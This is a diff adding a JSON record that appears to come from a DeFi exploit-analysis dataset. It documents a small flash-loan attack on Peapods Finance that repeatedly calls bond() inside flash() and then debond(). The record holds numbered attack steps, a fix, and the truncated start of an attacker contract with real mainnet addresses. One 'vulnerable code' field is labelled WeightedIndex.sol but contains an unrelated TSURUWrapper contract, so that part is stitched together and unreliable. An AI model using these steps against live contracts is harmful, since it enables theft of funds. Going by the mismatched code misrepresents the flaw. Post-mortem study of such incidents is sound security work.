@@ -1,0 +1,36 @@
+{
+ "id": "2024__2024-01-27_PeapodsFinance_FlashLoanBondAccumulation",
+ "source_file": "2024/2024-01-27_PeapodsFinance_FlashLoanBondAccumulation.md",
+ "title": "Peapods Finance — Flash Loan-Based Bond Accumulation Analysis",
+ "date": "2024-01-27",
+ "protocol": "Peapods Finance",
+ "chain": "Ethereum",
+ "loss_raw": "~$1,000",
+ "loss_usd": 1000.0,
+ "root_cause": "Repeatedly calling `bond()` inside the `flash()` callback to accumulate ppPP tokens, then recovering the full amount via `debond()` — identical pattern to BarleyFinance",
+ "attack_tx": null,
+ "vulnerable_contract": "ppPP 0xdbb20a97",
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: bond allowed inside flash callback\ninterface IppPP {\n    function flash(address recipient, address token, uint256 amount, bytes calldata data) external;\n    function bond(address token, uint256 amount) external;\n    function debond(uint256 amount, address[] memory tokens, uint8[] memory percents) external;\n    function callback(bytes calldata data) external;\n}\n\n// No logic to block bond() during flash() execution\n// → Repeated calls allow unlimited ppPP accumulation\n\n//",
+  "// File: WeightedIndex.sol\ncontract TSURUWrapper {\ncontract TSURUWrapper is ERC20, IERC1155Receiver, IERC721Receiver, ReentrancyGuard, Ownable{\n    IERC1155 public immutable erc1155Contract;\n    IERC721 public immutable erc721Contract;\n    uint256 public immutable tokenID;\n\n    uint256 public constant _maxTotalSupply = 431_386_000 * 1e18;\n    uint256 private constant ERC721_RATIO = 400 * 1e18; // 1 ERC721 = 400 * 10^18 ERC20\n    uint256 private constant ERC1155_RATIO = 400_000 * 1e18; // 1 ERC1155 = 400_000 * 10^18 ERC20\n\n    address private constant _mintAddress01 = address(0x7A1B3bA1a848696f2AD29dC85923DCA078F1bF1E);  // ❌ vulnerability\n    address private constant _mintAddress02 = address(0x49b7f6414999551FA27C2b3abd588928A6334C96);\n    address private constant _mintAddress03 = address(0x8f9e2f10CC75D7e765F5fB7fCAcE8A3fDE9D23FF);\n    address private constant _mintAddress04 = address(0x5222f9facd6998DE73d45175efE56A38639Ed10b);\n    address private constant _mintAddress05 = address(0xbB8891671e8FA53E616bb826C800d78C748fe963);\n    address private constant _mintAddress06 = address(0x6A355388555433CD876D1C01485523Ec1f464690);\n    address private constant _mintAddress07 = address(0xa9F6299A7DEAafc4a92AcB73fdF02ED4C72ce3b2);\n    address private constant _mintAddress08 = address(0xa9F6299A7DEAafc4a92AcB73fdF02ED4C72ce3b2);\n\n    // total init mint: 258_831_600 * 10^18\n    uint256 private constant _mintAmount01 = 172_554_400 * 1e18;\n    uint256 private constant _mintAmount02 = 3_451_088 * 1e18;\n    uint256 private constant _mintAmount03 = 9_490_492 * 1e18;\n    uint256 private constant _mintAmount04 = 14_365_154 * 1e18;\n    uint256 private constant _mintAmount05 = 8_627_720 * 1e18;\n    uint256 private constant _mintAmount06 = 21_569_300 * 1e18;\n    uint256 private constant _mintAmount07 = 14_408_292 * 1e18;\n    uint256 private constant _mintAmount08 = 14_365_154 * 1e18;\n\n    bool private _opened;\n\n    mapping(address owner => uint256) private _balancesOfOwner;\n    uint256 private _holders;\n\n    constructor(\n        address initialOwner,\n        address _erc1155Address,\n        address _erc721Contract,\n        uint256 _tokenID,\n        string memory _name,\n        string memory _symbol\n    ) ERC20(_name, _symbol) Ownable(initialOwner) {\n        require(_erc1155Address != address(0), \"Invalid ERC1155 address\");\n        require(_erc721Contract != address(0), \"Invalid ERC721 address\");\n        erc1155Contract = IERC1155(_erc1155Address);\n        erc721Contract = IERC721(_erc721Contract);\n\n        tokenID = _tokenID;\n        _opened = false;\n        _holders = 0;\n\n        _safeMint(_mintAddress01, _mintAmount01);\n        _safeMint(_mintAddress02, _mintAmount02);\n        _safeMint(_mintAddress03, _mintAmount03);\n        _safeMint(_mintAddress04, _mintAmount04);\n        _safeMint(_mintAddress05, _mintAmount05);\n        _safeMint(_mintAddress06, _mintAmount06);\n        _safeMint(_mintAddress07, _mintAmount07);\n        _safeMint(_mintAddress08, _mintAmount08);\n  "
+ ],
+ "code_after": [
+  "✅ Safe code\nbool private _flashActive;\n\nmodifier noFlashActive() {\n    require(!_flashActive, \"flash active\");\n    _;\n}\n\nfunction bond(address token, uint256 amount) external noFlashActive {\n    // Normal bond logic\n}\n\nfunction flash(...) external {\n    _flashActive = true;\n    // flash logic\n    _flashActive = false;\n}"
+ ],
+ "steps": [
+  "→ [1] Acquire 200 DAI",
+  "→ [2] Repeat 20 times:",
+  "→ approve 10 DAI → ppPP.flash(full Peas balance)",
+  "→ callback(): bond(Peas) → accumulate ppPP",
+  "→ [3] debond(accumulated ppPP, 100%) → recover large amount of Peas",
+  "→ [4] Peas → DAI → WETH (Uniswap V3 exactInput)",
+  "→ [5] ~$1K profit (small scale but structurally identical vulnerability)"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Acquire 200 DAI\n  │\n  ├─→ [2] Repeat 20 times:\n  │       ├─→ approve 10 DAI → ppPP.flash(full Peas balance)\n  │       └─→ callback(): bond(Peas) → accumulate ppPP\n  │\n  ├─→ [3] debond(accumulated ppPP, 100%) → recover large amount of Peas\n  │\n  ├─→ [4] Peas → DAI → WETH (Uniswap V3 exactInput)\n  │\n  └─→ [5] ~$1K profit (small scale but structurally identical vulnerability)",
+  "interface IppPP {\n    function flash(address recipient, address token, uint256 amount, bytes calldata data) external;\n    function bond(address token, uint256 amount) external;\n    function debond(uint256 amount, address[] memory tokens, uint8[] memory percents) external;\n    function callback(bytes calldata data) external;\n}\n\ncontract AttackContract {\n    IppPP  constant ppPP = IppPP(0xdbb20a979a92cccce15229e41c9b082d5b5d7e31);\n    IERC20 constant Peas = IERC20(0x02f92800F57BCD74066F5709F1Daa1A4302Df875);\n    IERC20 constant DAI  = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);\n\n    function testExploit() external {\n        // [1] Flash loan loop 20 times\n        for (uint i = 0; i < 20; i++) {\n            DAI.approve(address(ppPP), 10 ether);\n            ppPP.flash(address(this), ad"
+ ]
+}
